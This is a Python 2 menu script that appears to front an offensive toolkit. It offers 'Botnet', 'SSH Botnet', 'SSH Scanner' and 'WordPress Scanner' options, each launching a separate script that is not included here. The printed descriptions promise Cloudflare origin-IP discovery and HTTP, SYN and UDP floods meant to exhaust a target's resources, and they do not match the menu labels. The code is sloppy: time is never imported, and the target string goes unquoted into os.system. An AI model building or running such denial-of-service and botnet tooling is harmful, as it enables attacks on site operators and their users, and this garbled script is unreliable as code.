#!/usr/bin/env python

import os
import re 
import platform
import colorama
from colorama import Fore, Back, Style



R='\033[1;31m'
B='\033[1;34m'
Y='\033[1;33m'
G='\033[1;32m'
C='\033[1;36m'
N='\033[0m' 

#if platform.system() == 'Windows':
	#warn("This script has not yet been tested on a Windows machine.")
#elif platform.system() == 'Linux':
#	_continue = True
#	pass



def main():
	
	print \
"""				

[1] Botnet
[2] SSH Botnet
[3] SSH Scanner
[4] WordPress Scanner by S0u1


"""

	global option
	option = raw_input('Choose a Number #~: ')
 
	if option:
		if option == '1':
		  Botnet()

		elif option == '2':
			SSHBotnet()

		elif option == '3':
			SSHScanner() 

		elif option == "4":
			wordpress()	       
				
		else:
			print '\nInvalid Choice\n'
			time.sleep(0.9)
			main()    
 
	else:
		print '\nYou Must Enter An Option (Check if your typo is corrected.)\n'
		time.sleep(0.9)
		main()


def Botnet():
	print("This will search the cloudflare protected website for misconfigured DNS and will extract backend real IP.")
	os.system("cd modules && python2 Botnet.py")


def SSHBotnet():
	print("This will flood the websites with 100's and 1000's of http header requests and will try to suck all of it's resources.")
	os.system("cd SSH && python2 SSH.py")




def SSHScanner():
	print("This will bombard the host with infinite syn packets and tries to exhaust the resources.")
	os.system("cd SSH && python2 SSHScanner.py")


def wordpress():
    print("This will send infinite UDP packets and tries to exhaust host's resource fully.")
    http = raw_input("Select a Target ( Ex http/site.suffix ) Don't use www in anyway  : ")
    os.system("python2 wp.py %s"% http)




if __name__ == '__main__':
	main()